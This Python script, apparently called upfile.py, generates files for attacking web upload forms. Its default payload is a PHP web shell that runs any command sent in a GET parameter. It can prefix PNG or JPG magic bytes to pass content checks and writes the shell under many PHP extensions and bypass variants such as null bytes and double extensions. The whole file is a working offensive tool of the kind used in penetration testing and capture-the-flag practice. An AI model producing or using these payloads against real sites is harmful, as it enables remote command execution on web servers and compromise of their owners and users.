
import argparse
import platform

def createFile(name, extension, payload,debug):
    if debug:
        print(f'[+] File created : {name}.{extension}')
    if "\\" in extension:
            print(f"[-] You can't use \\ in the extension, create the file manually : {name}.{extension}")
    elif "/" in extension:
            print(f"[-] You can't use / in the extension, create the file manually : {name}.{extension}")
    else:
        if platform.system() == 'Windows':
            with open(f'Payloads\\{name}.{extension}', 'bw') as f:
                f.write(payload)
        else:
            with open(f'Payloads/{name}.{extension}', 'bw') as f:
                print(payload)
                f.write(payload)


def main(name, payload, file, extension, bypass, magic, debug):
    PHP_extensions = ['php', 'php2', 'php3', 'php4', 'php5', 'php7', 'phps', 'pht', 'phtm', 'phtml', 'pgif', 'shtml', 'htaccess', 'inc', 'phar', 'hphp', 'ctp', 'module']
    PHP_Bypass = ['png.php', 'png.Php5', 'php%20', 'php%0a', 'php%00', 'php%0d%0a','php/','php.\\','png.php','png.pHp5','php%00.png','php\\x00.png','php%0a.png','php%0d%0a.png','phpJunk123png','png.jpg.php', 'php%00.png%00.jpg', 'php.png']


    if magic == "png": # If the user want to use the magic header
        name = "magic_png_"+name
        payload = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0" + payload.encode('utf-8')
    elif magic == "jpg": # If the user want to use the magic header
        name = "magic_jpg_"+name
        payload = b"\xff\xd8\xff\xe0" + payload.encode('utf-8')
    else:
        payload = payload.encode('utf-8')

    if file in PHP_extensions: # If the file is a PHP file
        if extension is not None: # If the user specify an extension
            createFile(name, extension, payload,debug)
        elif bypass: # If the user want to bypass the restriction
            for ext in PHP_Bypass:
                createFile(name, ext, payload,debug)
        else:   # If the user don't specify an extension
            for ext in PHP_extensions:
                createFile(name, ext, payload,debug)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        prog='upfile.py',
        description='Generate some payload to bypass restriction when you perform a file upload')

    parser.add_argument('-d', '--debug', action='store_true', help='Seen the debug to see the process')
    parser.add_argument('-p', '--payload', help='The payload in the files', default='<?php system($_GET["cmd"]); ?>')
    parser.add_argument('-f', '--file', help='The type of the files', default='php', choices=['php'])
    parser.add_argument('-ext', '--extension', help='Generate the payload with specific extension')
    parser.add_argument('-b', '--bypass', action='store_true', help='Bypass the restriction')
    parser.add_argument('-n', '--name', help='Name of the file', default='payload')
    parser.add_argument('-m', '--magic', help='Magic Header', choices=['png', 'jpg'])
    args = parser.parse_args()
    print(args)

    main(args.name, args.payload, args.file, args.extension, args.bypass, args.magic, args.debug)
